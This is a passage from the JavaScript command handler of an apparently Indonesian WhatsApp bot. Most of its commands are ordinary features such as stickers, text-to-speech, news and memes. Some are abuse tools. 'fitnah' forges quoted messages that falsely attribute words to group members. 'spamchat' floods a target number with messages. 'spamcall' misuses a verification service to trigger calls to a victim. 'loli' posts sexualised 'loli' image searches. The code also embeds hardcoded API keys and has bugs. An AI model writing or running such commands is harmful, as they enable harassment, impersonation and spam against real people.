					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(ind.wait())
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(ind.stikga())
							})
							.on('end', function () {
								console.log('Finish')
								buffer = fs.readFileSync(ran)
								client.sendMessage(from, buffer, sticker, {quoted: freply})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
							} else {
						reply(`Kirim gambar/video/gif dengan caption \n${prefix}sticker (durasi sticker video 1-9 detik)`)
					}
					break
                case 'tts':
                if (!isRegistered) return reply(ind.noregis())
					if (args.length < 1) return jere.sendMessage(from, 'Kode bahasanya mana kak?', text, {quoted: mek})
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return jere.sendMessage(from, 'Textnya mana kak?', text, {quoted: mek})
					dtt = body.slice(9)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? reply('Textnya kebanyakan kak')
					: gtts.save(ranm, dtt, function() {
						client.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})
					break
					case 'fitnah':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isBanned) return reply(ind.baned())
				if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
				var Renegs = body.slice(8)
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				var replace = Renegs.split("|")[0];
				var target = Renegs.split("|")[1];
				var bot = Renegs.split("|")[2];
				client.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
				await limitAdd(sender)
			break
                    case 'join':
if (!isRegistered) return reply( ind.noregis())
if (!isPremium) return reply('Maaf kamu bukan user premium!')
if (isBanned) return reply(ind.baned()) 
if (args.length < 1) return reply('Link nya mana?')
client.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply(`Sukses Join`)
break
		case 'clone':
					if (!isGroup) return reply(ind.groupo())
					if (!isOwner) return reply(ind.ownerg()) 
					if (args.length < 1) return reply(' *TAG YANG MAU DI CLONE!!!* ')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('❬ SUCCSESS ❭')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
					let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
					try {
						pp = await client.getProfilePicture(id)
						buffer = await getBuffer(pp)
						client.updateProfilePicture(botNumber, buffer)
						mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
					} catch (e) {
						reply(ind.stikga())
					}
					await limitAdd(sender)
					break
				case 'wait':
					
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						reply(ind.wait())
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						media = await client.downloadMediaMessage(encmedia)
						await wait(media).then(res => {
							client.sendMessage(from, res.video, video, {quoted: mek, caption: res.teks.trim()})
						}).catch(err => {
							reply(err)
						})
					} else {
						reply(ind.ocron())
					}
					await limitAdd(sender)
					break

case 'waifu':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
if (!isRegistered) return reply( ind.noregis()) 
reply(ind.wait())
waifu = await getBuffer(`https://api.lolhuman.xyz/api/random/waifu?apikey=${lolkey}`)
client.sendMessage(from, waifu, image, { quoted: mek})
break
case 'husbu':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
if (!isRegistered) return reply( ind.noregis()) 
reply(ind.wait())
husbu = await getBuffer(`https://api.lolhuman.xyz/api/random/husbu?apikey=${lolkey}`)
client.sendMessage(from, husbu, image, { quoted: mek})
break
case 'loli':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, aine telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				client.updatePresence(from, Presence.composing)
				ty = ["loli","loli kawai","loli sagiri","anime loli","loli cat"]
				nk = ty[Math.floor(Math.random() * ty.length)]
				try {
				data = await fetchJson(`https://api.zeks.xyz/api/pinimg?apikey=apikeyaine&q=${nk}`, {
				method: 'get'
				})
				reply(ind.pedo())
				yana = data.data
				n = JSON.parse(JSON.stringify(yana));
				nimek = n[Math.floor(Math.random() * n.length)];
				pok = await getBuffer(nimek)
				client.sendMessage(from, pok, image, {
				quoted: mek, caption: `Cintai lolimu mas ^_^`
				})
				await limitAdd(sender)
				} catch {
				reply(ind.pedo())
				}
				break
				case 'waifu':
					if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
					gatauda = body.slice(7)
					reply(ind.wait())
					data = await fetchJson('https://waifu.pics/api/sfw/waifu')
					buffer = await getBuffer(data.url)
					client.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
		break
				case 'pictcewek':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				client.updatePresence(from, Presence.composing)
				ty = ["ulzhang girl","cewek cantik","cewek hijab","cute girl","cewek rusia cantik","cewek jepang cantik","cecan indo"]
				nk = ty[Math.floor(Math.random() * ty.length)]
				try {
				data = await fetchJson(`https://api.zeks.xyz/api/pinimg?apikey=${ZeksApi}&q=${nk}`, {
				method: 'get'
				})
				reply(ind.wait())
				yana = data.data
				n = JSON.parse(JSON.stringify(yana));
				nimek = n[Math.floor(Math.random() * n.length)];
				pok = await getBuffer(nimek)
				client.sendMessage(from, pok, image, {
				quoted: mek, caption: `Tuh udah Reneasy cariin foto cewe cantik`
				})
				await limitAdd(sender)
				} catch {
				reply(ind.wait())
				}
				break
			case 'pictcowok':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				client.updatePresence(from, Presence.composing)
				uk = ["ulzhang boy","cowok keren","cowok ganteng","cogan","cowok korea"]
				nk = uk[Math.floor(Math.random() * uk.length)]
				try {
				data = await fetchJson(`https://api.zeks.xyz/api/pinimg?apikey=${ZeksApi}&q=${nk}`, {
				method: 'get'
				})
				reply(ind.wait())
				yana = data.data
				n = JSON.parse(JSON.stringify(yana));
				nimek = n[Math.floor(Math.random() * n.length)];
				pok = await getBuffer(nimek)
				client.sendMessage(from, pok, image, {
				quoted: mek, caption: `Tuh udah Reneasy cariin cowo ganteng`
				})
				await limitAdd(sender)
				} catch {
				reply(ind.wait())
				}
				break
case 'elf':
if (isBanned) return reply('Maaf kamu sudah terbenned!')
if (!isRegistered) return reply( ind.noregis()) 
reply(ind.wait())
elf = await getBuffer(`https://api.lolhuman.xyz/api/random/elf?apikey=${lolkey}`)
client.sendMessage(from, elf, image, { quoted: mek})
break
//MAKERMENU
                    // Textprome //
                /*case 'blackpink':
                case 'neon':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} Its Ara`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    client.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break*/
                /*case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
		if (!isRegistered) return reply(ind.noregis())
               cf = `${body.slice(8)}`
                    txt1 = cf.split("/")[0];
                    txt2 = cf.split("/")[1];
                    if (args.length == 0) return reply(`Example: ${prefix + command} Its Ara`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`)
                    client.sendMessage(from, ini_buffer, image, { quoted: mem})
                    break*/

                    // Photo Oxy //
                /*case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} Its Ara`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    client.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break*/
                /*case 'tiktok':
                case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
		if (!isRegistered) return reply(ind.noregis())
		            cf = `${body.slice(8)}`
                    txt1 = cf.split("/")[0];
                    txt2 = cf.split("/")[1];
                    if (args.length == 0) return reply(`Example: ${prefix + command} Its Ara`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`)
                    client.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break*/
                    // INI HARTATHTA CUY
                    /*case 'hartatahta':
                case 'hartacustom':
                if (!isRegistered) return reply(ind.noregis())
                if (isLimit(sender)) return reply(ind.limitend(pusname))
                if (isBanned) return reply(ind.baned())
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                ini_text = args.join(" ")
                reply(ind.wait())
                ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${ini_text}`)
                client.sendMessage(from, ini_buffer, image, {quoted: freply})
                await limitAdd(sender)
                break*/
                case 'attp':
                if (!isRegistered) return reply(ind.noregis())
                if (isLimit(sender)) return reply(ind.limitend(pusname))
                if (isBanned) return reply(ind.baned())
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                ini_text = args.join(" ")
                reply(ind.wait())
                ini_buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${ini_text}`)
                client.sendMessage(from, ini_buffer, sticker, {quoted: freply})
                await limitAdd(sender)
                break
                // ATTP YA COK
                /*case 'ttp':
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                if (!isRegistered) return reply(ind.noregis())
                if (isLimit(sender)) return reply(ind.limitend(pusname))
                if (isBanned) return reply(ind.baned())
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                ini_text = args.join(" ")
                reply(ind.wait())
                ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${ini_text}`)
                client.sendMessage(from, ini_buffer, sticker, {quoted: freply})
                await limitAdd(sender)
                break*/

                    // Ephoto 360 //
                /*case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Example: ${prefix + command} Its Ara`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    client.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break*/
                    /*case 'amongus':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nContoh: ${prefix + command} Fernazer`)
                    buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/amongus?apikey=${lolkey}&text=${body.slice(9)}`)
                    client.sendMessage(from, buffer, sticker, { quoted: mek})
                    break*/
                    case 'artinama':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Apa yang mau dicari um?')
				anu = await fetchJson(`https://mnazria.herokuapp.com/api/arti?nama=${body.slice(10)}`, {method: 'get'})
				reply('Menurut nama:\n\n'+anu.result)
				await limitAdd(sender)
			break
                case 'jadian':
				if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ♥️ @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break
					case 'faktaunik':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				anu = await fetchJson(`https://pencarikode.xyz/api/faktaunik?apikey=pais`, {method: 'get'})
				reply(anu.message)
				await limitAdd(sender)
			break
			case 'tribunews':
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					client.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/tribunews?apikey=${ZeksApi}`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Judul* : ${i.title}\n*Time* : ${i.time}\n*Link* : ${i.url}\n*Keterangan* : ${i.ket}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
			    case 'liputan6': 
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					client.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/liputan6?apikey=${ZeksApi}`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Judul* : ${i.title}\n*Url* : ${i.url}\n*Keterangan* : ${i.ket}\n*Category* : ${i.category}\n*Time* : ${i.time}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
				    case 'foxnews': 
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					client.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/foxnews?apikey=${ZeksApi}`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Judul* : ${i.title}\n*Url* : ${i.url}\n*Country* : ${i.country}\n*Content* : ${i.content}\n*Time* : ${i.time}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
			case 'infogempa':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply( 'Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				anu = await fetchJson(`https://pencarikode.xyz/api/gempa?apikey=pais`, {method: 'get'})
				if (anu.error) return reply(anu.error)
				hasil = `*Bujur*\n${anu.result.Bujur}\n*Lokasi*\n${anu.result.Wilayah}\n*Magnitude*\n${anu.result.Magnitudo}\n*Lintang*\n${anu.result.Lintang}\n*Kedalaman*\n${anu.result.Kedalaman}\n*Waktu*\n${anu.result.Waktu}`
				client.sendMessage(from, hasil, text, {quoted: mek})
				await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
			break
			case 'infocuaca':
				tels = body.slice(11)
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply( 'Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isBanned) return reply(ind.baned())
				anu = await fetchJson(`https://rest.farzain.com/api/cuaca.php?id=${tels}&apikey=O8mUD3YrHIy9KM1fMRjamw8eg`, {method: 'get'})
				if (anu.error) return reply(anu.error)
				hasil = `*Tempat* : ${anu.respon.tempat}\n*Cuaca* : ${anu.respon.cuaca}\n*Angin* : ${anu.respon.angin}\n*Suhu* : ${anu.respon.suhu}\n*Kelembapan* : ${anu.respon.kelembapan}`
				client.sendMessage(from, hasil, text, {quoted: mek})
				await limitAdd(sender)
				break
				case 'readmore':
			case 'more':
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isBanned) return reply('Maaf, aine telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				const more = String.fromCharCode(8206)
				const readmore = more.repeat(4001)
				if (!q.includes('|')) return  reply(ind.wrongf())
				const text1 = q.substring(0, q.indexOf('|') - 0)
				const text2 = q.substring(q.lastIndexOf('|') + 1)
				reply( text1 + readmore + text2)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
			break
				case 'meme':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				reply(ind.wait())
				meme = await fetchJson('https://kagchi-api.glitch.me/meme/memes', { method: 'get' })
				const mme = await getBuffer(`https://imgur.com/${meme.hash}.jpg`)
				client.sendMessage(from, mme, MessageType.image, {quoted: mek, caption: 'Ni kak..'})
				await limitAdd(sender)
				break	
			case 'memeindo':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				reply(ind.wait())
				anu = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=apikeyRene`, {method: 'get'})
				const mmeind = await getBuffer(anu.result)
				client.sendMessage(from, mmeind, MessageType.image, {quoted: mek})
				await limitAdd(sender)
				break
				case 'niatshalat':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
					data = await fetchJson(`https://zahirr-web.herokuapp.com/api/muslim/niatshalat?apikey=zahirgans`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `${i.arabic}\n\n*Latin* : ${i.latin}\n*Bacaan* : ${i.name}\n*Terjemah* : ${i.terjemahan}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
			break
			case 'asmaulhusna':
					if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
					data = await fetchJson(`https://zahirr-web.herokuapp.com/api/muslim/asmaulhusna?apikey=zahirgans`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result.data) {
						teks += `${i.arabic}\n\n*Nomor* : ${i.index}\n*Latin* : ${i.latin}\n*Terjemah* : ${i.translation_id}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
			break
				case 'findnabi':
					if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				        nabi = body.slice(10)
					data = await fetchJson(`https://kisahnabi-api-zhirrr.vercel.app/api/searchnabi?q=${nabi}`)
					nabii = `Nama : ${data.nabi.nama}\nUmur : ${data.nabi.umur}\n\n${data.nabi.kisah}`
					reply(nabii)
					await limitAdd(sender)
					break
					case 'spamchat': //CASE BY Manik
if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isPremium) return reply('Maaf kamu bukan user premium!')
				if (isBanned) return reply(ind.baned())
if (args < 2) return reply(`masukan parameter yang benar\nexampel : ${prefix}spamchat nomertujuan jumblah pesan\ncontoh ${prefix}spamchat 082334297175 10 woi asu`)
nomer = args[0]
totall = args[1]
Pesan = args[2]
for ( let i = 0 ; i < totall; i++) {
client.sendMessage( nomer + '@s.whatsapp.net' , pesan , Text)
}  
break
				case 'spamcall':
					if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (!isPremium) return reply('Maaf kamu bukan user premium!')
				if (isBanned) return reply(ind.baned())
					if (args.length < 1) return reply('Nomor nya mana kak?!!!')
					data = await fetchJson(`https://id.jagreward.com/member/verify-mobile/${body.slice(10)}`)
					spcall = `*Nomor Bot* : _${data.phone_prefix}_\n\n_Bot berhasil menlpon anda!_`
					reply(spcall)
				        await limitAdd(sender)
					break
					case 'joox':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (!isPremium) return reply('Maaf kamu bukan user premium!')
				if (isBanned) return reply(ind.baned())
				data = await fetchJson(`https://pencarikode.xyz/download/joox?search=${body.slice(6)}&apikey=pais`, {method: 'get'})
				if (data.error) return reply(data.error)
				infomp3 = `*Lagu Ditemukan!!!*\nArtis : ${data.result.artist} - ${data.result.judul}\nAlbum : ${data.result.album}\nUkuruan : ${data.result.filesize}`
				buffer = await getBuffer(data.result.img_url)
				lagu = await getBuffer(data.result.mp3_url)
				client.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
				client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${data.result.judul}.mp3`, quoted: mek})
				await limitAdd(sender)
				break
				case 'igmp4':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (!isPremium) return reply('Maaf kamu bukan user premium!')
				if (isBanned) return reply(ind.baned())
				reply(ind.wait())
				if (args.length < 1) return reply('Urlnya mana kak?')
				if(!isUrl(args[0]) && !args[0].includes('instagram')) return reply(ind.stikga())
				anu = await fetchJson(`https://api.xteam.xyz/dl/ig?url=${args[0]}/&APIKEY=${Xteam}`, {method: 'get'})
				if (anu.error) return reply(anu.error)
				teeks = `❏ *Tunggu Bentar Ya Kak, Vidoenya Lagi Di Kirim...*`
				thumbs = await getBuffer(`https://i.ibb.co/4KSh6DX/maxresdefault.jpg`)
				client.sendMessage(from, thumbs, image, {quoted: mek, caption: teeks})
				buffer = await getBuffer(anu.result.video)
				client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: mek})
				await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
			break
                /*case 'tebakumur':
		if (!isRegistered) return reply(ind.noregis())
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Fernazer`)
                    ini_name = args.join(" ")
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Fernazer`)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/tebakumur?apikey=${lolkey}&name=${ini_name}`)
                    get_result = get_result.result
                    ini_txt = `Nama : ${get_result.name}\n`
                    ini_txt += `Umur : ${get_result.age}`
                    reply(ini_txt)
                    break*/
               case 'alay':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				if (args.length < 1) return reply('kasih teks lah^_^!!!')
				data = await fetchJson(`https://api.terhambar.com/bpk?kata=${body.slice(6)}`)
				reply(data.text)
			        await limitAdd(sender)
			break
			case 'bisakah':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isBanned) return reply(ind.baned())
				bisakah = body.slice(1)
				const bisa =['Iya','Tidak','Bisa Jadi','Coba Ulangi','Yo iso']
				const keh = bisa[Math.floor(Math.random() * bisa.length)]
				client.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
				break
				case 'kapankah':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isBanned) return reply(ind.baned())
				kapankah = body.slice(1)
